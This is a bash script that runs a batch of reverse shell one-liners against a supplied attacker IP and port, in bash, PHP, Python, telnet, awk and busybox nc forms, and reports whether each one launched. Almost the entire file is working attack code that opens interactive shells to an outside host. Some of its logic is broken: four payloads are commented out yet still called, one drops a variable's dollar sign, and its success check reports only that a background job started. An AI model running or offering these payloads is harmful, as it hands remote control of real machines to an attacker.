#!/bin/bash
# Bash script for testing of reverse shell payloads and checks if they ran successfully.
# To use, include attacker IP address & port

# Function to display usage
usage() {
    echo "Usage: $0 ATTACKER_IP PORT"
    echo "Example: ./shell_check.sh 192.168.1.100 443"
    exit 1
}

# Check if arguments are provided
if [ $# -ne 2 ]; then
    usage
fi

ATTACKER_IP=$1
PORT=$2

# Function to run and check a payload
run_payload() {
    PAYLOAD="$1"
    DESC="$2"

    echo "Running: $DESC"
    bash -c "$PAYLOAD" &

    # Check if the last command succeeded
    if [ $? -eq 0 ]; then
        echo "$DESC - Success!!!"
    else
        echo "$DESC - Failed :( "
    fi
}

# Payloads
#PAYLOAD_1="bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
#PAYLOAD_2="exec 5<>/dev/tcp/$ATTACKER_IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done"
#PAYLOAD_3="0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$PORT; sh <&196 >&196 2>&196"
#PAYLOAD_4="bash -i 5<> /dev/tcp/ATTACKER_IP/$PORT 0<&5 1>&5 2>&5"
PAYLOAD_5="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);exec(\"sh <&3 >&3 2>&3\");'"
PAYLOAD_6="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);shell_exec(\"sh <&3 >&3 2>&3\");'"
PAYLOAD_7="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);system(\"sh <&3 >&3 2>&3\");'"
PAYLOAD_8="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);passthru(\"sh <&3 >&3 2>&3\");'"
PAYLOAD_9="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);popen(\"sh <&3 >&3 2>&3\", \"r\");'"
PAYLOAD_10="export RHOST=\"$ATTACKER_IP\"; export RPORT=$PORT; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'"
PAYLOAD_11="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ATTACKER_IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
PAYLOAD_12="python -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ATTACKER_IP\",$PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'"
PAYLOAD_13="TF=\$(mktemp -u); mkfifo \$TF && telnet \$ATTACKER_IP \$PORT 0<\$TF | sh 1>\$TF"
PAYLOAD_14="awk 'BEGIN {s = \"/inet/tcp/0/$ATTACKER_IP/$PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
PAYLOAD_15="busybox nc $ATTACKER_IP $PORT -e sh"

# Descriptions
DESC_1="PAYLOAD_1 Normal Bash Reverse Shell"
DESC_2="PAYLOAD_2 Bash Read Line Reverse Shell"
DESC_3="PAYLOAD_3 Bash With File Descriptor 196 Reverse Shell"
DESC_4="PAYLOAD_4 Bash With File Descriptor 5 Reverse Shell"
DESC_5="PAYLOAD_5 PHP Reverse Shell Using the exec Function"
DESC_6="PAYLOAD_6 PHP Reverse Shell Using the shell_exec Function"
DESC_7="PAYLOAD_7 PHP Reverse Shell Using the system Function"
DESC_8="PAYLOAD_8 PHP Reverse Shell Using the passthru Function"
DESC_9="PAYLOAD_9 PHP Reverse Shell Using the popen Function"
DESC_10="PAYLOAD_10 Python Reverse Shell by Exporting Environment Variables"
DESC_11="PAYLOAD_11 Python Reverse Shell Using the subprocess Module"
DESC_12="PAYLOAD_12 Short Python Reverse Shell"
DESC_13="PAYLOAD_13 Telnet"
DESC_14="PAYLOAD_14 AWK"
DESC_15="PAYLOAD_15 BusyBox"

# Run payloads
run_payload "$PAYLOAD_1" "$DESC_1"
run_payload "$PAYLOAD_2" "$DESC_2"
run_payload "$PAYLOAD_3" "$DESC_3"
run_payload "$PAYLOAD_4" "$DESC_4"
run_payload "$PAYLOAD_5" "$DESC_5"
run_payload "$PAYLOAD_6" "$DESC_6"
run_payload "$PAYLOAD_7" "$DESC_7"
run_payload "$PAYLOAD_8" "$DESC_8"
run_payload "$PAYLOAD_9" "$DESC_9"
run_payload "$PAYLOAD_10" "$DESC_10"
run_payload "$PAYLOAD_11" "$DESC_11"
run_payload "$PAYLOAD_12" "$DESC_12"
run_payload "$PAYLOAD_13" "$DESC_13"
run_payload "$PAYLOAD_14" "$DESC_14"
run_payload "$PAYLOAD_15" "$DESC_15"

